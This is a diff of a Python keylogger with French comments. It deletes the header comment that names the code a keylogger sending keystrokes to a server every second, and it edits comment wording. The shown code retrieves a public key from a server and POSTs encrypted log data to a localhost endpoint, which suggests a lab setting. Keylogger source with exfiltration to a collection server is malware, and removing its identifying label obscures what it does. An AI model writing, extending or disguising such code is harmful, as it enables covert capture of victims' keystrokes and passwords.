@@ -1,7 +1,3 @@
-# Ce code est un keylogger. Il enregistre les frappes au clavier et les envoie au serveur toutes les secondes.
-# La communication avec le serveur se fait via HTTP.
-
-# Importation des bibliothèques nécessaires
 import threading
 import time
 import base64
@@ -30,10 +26,10 @@ def get_public_key_from_server():
         print('An error occurred while retrieving the public key: ', e)
 
 
-# Fonction pour envoyer les données cryptées au serveur
+# Fonction pour envoyer les données chiffrées au serveur
 def send_message_to_server(ciphered_message):
     try:
-        # Envoi de la requête HTTP POST pour envoyer les données cryptées
+        # Envoi de la requête HTTP POST pour envoyer les données chiffrées
         requests.post('http://127.0.0.1:5000/rsa/logs/', data={'message': ciphered_message})
     except requests.exceptions.RequestException as e:
         # En cas d'erreur lors de la requête, affichage d'un message d'erreur
